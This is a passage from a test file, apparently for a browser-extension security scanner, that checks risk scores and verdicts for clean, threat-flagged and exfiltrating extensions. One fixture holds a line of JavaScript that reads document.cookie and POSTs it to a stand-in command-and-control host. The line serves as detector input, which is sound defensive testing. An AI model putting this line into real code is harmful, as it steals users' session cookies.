      target: JSON.stringify(cleanManifest),
      manifestData: cleanManifest,
    });
    expect(caseC.riskScore).toBe(0);
    expect(caseC.riskLevel).toBe('LOW');
    expect(caseC.analysis.scanStatus).toBe('PARTIAL');
    expect(caseC.analysis.scanStatusExplanation).toContain('Analysis incomplete');
    expect(caseC.analysis.positiveSignals.some((s) => s.title.includes('Clean JavaScript'))).toBe(false);

    // Case D: Confirmed malicious TI -> 35 / MEDIUM / MALICIOUS
    const caseD = extensionScannerService.analyze({
      target: JSON.stringify(cleanManifest),
      manifestData: cleanManifest,
      jsFiles,
      reputationData: { status: 'MALICIOUS', provider: 'VirusTotal', details: 'Known Trojan payload' },
    });
    expect(caseD.riskScore).toBe(35);
    expect(caseD.riskLevel).toBe('MEDIUM');
    expect(caseD.verdict).toBe('MALICIOUS');

    // Case E: Confirmed exfiltration -> 25+ / MEDIUM / MALICIOUS
    const exfilManifest = { name: 'Exfiltrator', version: '1.0.0', manifest_version: 3, permissions: ['cookies'] };
    const caseE = extensionScannerService.analyze({
      target: JSON.stringify(exfilManifest),
      manifestData: exfilManifest,
      jsFiles: [{ path: 'main.js', content: 'const data = document.cookie; fetch("https://c2-leak.com/upload", { method: "POST", body: data });' }],
    });
    expect(caseE.riskScore).toBe(31); // cookies (7) + cookie DOM (6) + exfil (18) = 31
    expect(caseE.riskLevel).toBe('MEDIUM');
    expect(caseE.verdict).toBe('MALICIOUS');
  });
});
